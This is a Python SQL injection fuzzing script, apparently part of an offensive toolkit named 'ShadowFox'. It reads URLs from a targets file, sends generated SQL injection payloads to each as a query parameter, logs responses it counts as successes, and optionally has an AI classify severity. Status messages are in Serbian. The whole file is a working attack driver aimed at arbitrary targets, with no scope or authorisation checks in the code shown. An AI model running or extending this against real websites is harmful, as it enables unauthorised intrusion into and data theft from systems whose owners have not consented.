import requests
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from tools.sql_payload_mutator import generate_sql_payloads
from poc_scripts.auto_add_severity import classify_severity
from poc_scripts.log_to_text import log_to_text
from logics.fuzz_ai_trigger import ai_trigger_if_needed
from utils.use_ai_flag import USE_AI

def fuzz_param_splitter(url):
    base_param = "param"
    payloads = generate_sql_payloads(url)

    headers = {
        "User-Agent": "ShadowFox-ParamSplitter"
    }

    for payload in payloads:
        test_url = f"{url}?{base_param}={payload}"
        try:
            res = requests.get(test_url, headers=headers, timeout=8)
            if res.status_code == 200 and ("error" not in res.text.lower() or "alert" in res.text.lower()):
                log_to_text(f"[FUZZ_PARAM_SPLITTER] {test_url}")

                if USE_AI:
                    severity = classify_severity(res.text)
                else:
                    severity = "Medium"

                ai_trigger_if_needed("Fuzz Param Splitter", test_url, payload, res.text, severity)
                print(f"[+] Splitter fuzz uspešan: {test_url}")
        except Exception as e:
            print(f"[-] Greška kod {test_url}: {e}")

    print("[-] Param Splitter fuzz završen.")
    return None

if __name__ == "__main__":
    with open("targets/targets.txt", "r") as f:
        urls = f.read().splitlines()

    for url in urls:
        fuzz_param_splitter(url)
